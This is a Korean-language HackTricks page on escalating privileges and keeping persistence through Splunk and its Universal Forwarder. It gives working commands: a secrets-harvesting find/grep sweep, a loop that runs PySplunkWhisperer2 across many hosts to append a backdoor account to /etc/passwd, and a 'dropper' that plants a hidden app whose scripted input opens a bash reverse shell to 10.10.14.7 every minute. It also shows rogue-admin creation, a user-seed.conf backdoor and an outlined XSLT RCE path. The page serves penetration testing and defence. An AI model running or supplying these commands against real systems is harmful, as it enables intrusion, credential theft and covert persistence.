# Splunk LPE 및 Persistence

{{#include ../../banners/hacktricks-training.md}}

머신을 **내부** 또는 **외부에서 열거**하는 중 **Splunk가 실행 중인 것**을 발견하면(일반적으로 웹 UI는 **8000**, management API는 **8089**), 유효한 자격 증명을 app 설치, scripted inputs 또는 management actions를 통한 **code execution**으로 전환할 수 있는 경우가 많습니다. Splunk가 **root**로 실행 중이라면 이는 즉각적인 **privilege escalation**으로 이어지는 경우가 많습니다.

일반적인 원격 공격 표면, 열거 또는 app-upload RCE 경로만 필요한 경우 다음을 확인하세요:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

이미 **root**이고 Splunk service가 localhost에서만 수신 대기하도록 설정되어 있지 않다면, **Splunk password hashes**를 훔치거나 **encrypted secrets**를 복구하거나 **malicious app**을 배포하여 로컬 또는 여러 forwarder에 걸쳐 persistence를 유지할 수도 있습니다.

## 흥미로운 로컬 파일

Splunk 또는 Splunk Universal Forwarder가 실행 중인 호스트에 접근했다면, 일반적으로 다음 경로가 가장 흥미롭습니다:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
중요한 artifacts:

- **`$SPLUNK_HOME/etc/passwd`**: 로컬 Splunk users 및 password hashes.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: 여러 `.conf` 파일에 저장된 secrets를 Splunk가 encrypt하는 데 사용하는 key.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: 초기 admin bootstrap file이며, gold images 및 provisioning 실수에서 유용합니다. `etc/passwd`가 이미 존재하면 무시됩니다.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted inputs가 일반적으로 활성화되는 위치입니다.
- **`$SPLUNK_HOME/etc/deployment-apps/`** 또는 **`$SPLUNK_HOME/etc/apps/`**: persistent app을 숨기거나 이미 배포 중인 항목을 검토하기에 좋은 위치입니다.

## Splunk Universal Forwarder Agent Exploit 요약

자세한 내용은 [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)를 참고하세요. 다음은 요약입니다:

**Exploit 개요:**
Splunk Universal Forwarder(UF)를 대상으로 하는 exploit을 사용하면 **agent password**를 보유한 attackers가 agent를 실행 중인 시스템에서 arbitrary code를 실행할 수 있으며, 결과적으로 environment의 상당 부분이 compromise될 수 있습니다.

**작동하는 이유:**

- UF management service는 일반적으로 **TCP 8089**에서 노출됩니다.
- Attackers는 API에 authenticate한 후 forwarder에 **malicious app bundle**을 install하도록 지시할 수 있습니다.
- 동일한 primitive을 로컬 **LPE** 또는 원격 **RCE**에 사용할 수 있습니다.
- **SplunkWhisperer2**와 같은 public tooling은 app bundle을 자동으로 생성하며 Linux targets에 맞게 payloads를 조정할 수 있습니다.

**Password를 복구하는 일반적인 방법:**

- Documentation, scripts, shares 또는 deployment automation에 저장된 cleartext credentials.
- `$SPLUNK_HOME/etc/passwd` 내부의 password hashes를 확보한 뒤 offline cracking 수행.
- `user-seed.conf`와 같은 golden images 또는 provisioning leftovers.

**영향:**

- 각 compromised host에서 SYSTEM/root-level code execution.
- Persistent apps, backdoors 또는 ransomware 배포.
- Data가 forward되기 전에 telemetry를 disable하거나 tamper.

**Exploit을 위한 예시 command:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**사용 가능한 public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Scripted Inputs 또는 Malicious Apps를 통한 Persistence

`root`/`splunk` 권한으로 **filesystem write access**가 있거나, 인증된 상태로 apps를 설치할 수 있다면 **scripted input**이 포함된 **custom app**을 배포하는 것은 매우 안정적인 persistence 메커니즘입니다. Splunk 자체 documentation에서는 scripted inputs가 app directory 내에 있어야 하며 `inputs.conf`에서 활성화되어야 한다고 안내합니다.

일반적인 layout:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
최소한의 `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
빠른 Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
참고:

- 동일한 trick은 `/opt/splunkforwarder/etc/apps/`를 사용하는 **Universal Forwarder**에서도 작동합니다.
- Attackers는 명백히 malicious한 app을 생성하는 대신 정상적인 add-on을 수정하여 위장하는 경우가 많습니다.
- **deployment server**에서 malicious app을 `deployment-apps/` 내부에 심으면 **fleet-wide persistence**로 이어집니다. forwarder가 updated app을 polling하고 다운로드하며, 적용을 위해 재시작하는 경우가 많기 때문입니다.

## Credential Theft and Admin Takeover

Splunk의 로컬 파일을 읽을 수 있다면 일반적으로 두 가지 좋은 목표가 있습니다. **Splunk admin access** 복구와 **encrypted service credentials** 복구입니다.

### Password hashes and local users

Splunk는 로컬 authentication data를 `etc/passwd`에 저장합니다. deployment에 따라 해당 파일을 cracking하면 web UI와 management API에서 사용할 수 있는 credentials를 복구할 수 있습니다.

이미 유효한 **admin** credentials를 보유하고 있고 Splunk가 **native** authentication backend를 사용한다면, CLI 자체를 persistence에 사용할 수 있습니다:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` 및 암호화된 값

Splunk는 여러 configuration file에 저장된 민감한 값을 보호하기 위해 `etc/auth/splunk.secret`을 사용합니다. **secret**과 관련된 **`.conf` file**을 모두 탈취할 수 있다면 다음 값을 복구하거나 재사용할 수 있는 경우가 많습니다.

- `pass4SymmKey`와 같은 forwarder/indexer shared secret
- `sslPassword`와 같은 TLS private-key password
- `bindDNPassword`와 같은 LDAP bind credential

이는 Splunk admin password 자체를 crack할 수 없는 경우에도 **lateral movement**에 유용합니다.

### `user-seed.conf` 악용

`user-seed.conf`는 최초 시작 시 또는 `etc/passwd`가 존재하지 않을 때만 사용됩니다. 따라서 live box에서는 유용성이 떨어지지만 다음 환경에서는 매우 중요합니다.

- compromised installation template
- container image
- unattended provisioning workflow
- Splunk가 자동으로 reinitialize되는 appliance

이러한 경우 `splunk hash-passwd`로 생성한 `HASHED_PASSWORD`를 심어 두면 redeployment 후 admin access를 조용히 되찾을 수 있습니다.

## Splunk Query 악용

자세한 내용은 [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)를 확인하세요.

최근 유용한 technique 중 하나는 취약한 Splunk Enterprise version에서 **user-supplied XSLT**를 악용하여 low-privileged authenticated account를 **OS command execution**이 가능한 `splunk` user로 전환하는 것입니다.

High-level flow:

1. Splunk에 authenticate합니다.
2. preview/upload functionality를 통해 malicious **XSL** file을 upload합니다.
3. Splunk가 **dispatch** directory에 업로드된 stylesheet를 사용하여 search result를 render하도록 합니다.
4. XSLT payload를 사용해 file을 작성하거나 Splunk의 search pipeline을 통해 execution을 유발합니다. 예를 들어 `runshellscript`와 같은 internal functionality에 도달할 수 있습니다.

공격 관점에서 중요한 점은 이 경로가 **app upload 없이 가능한 post-auth RCE**라는 것입니다. Linux에서는 일반적으로 **`splunk`** account를 획득하게 되며, 이 account는 여전히 가치가 있습니다. 해당 user가 application tree를 소유하고, secret을 읽을 수 있으며, shell을 잃더라도 유지되는 persistent app을 심을 수 있는 경우가 많기 때문입니다.

Exploitation 중 사용되는 대표적인 path는 다음과 같습니다:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Splunk이 과도한 권한으로 실행 중이거나 `splunk` 사용자가 위험한 스크립트, 쓰기 가능한 service unit 또는 잘못된 `sudo` 규칙에 액세스할 수 있다면, 이는 깔끔한 **LPE** 체인이 됩니다.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
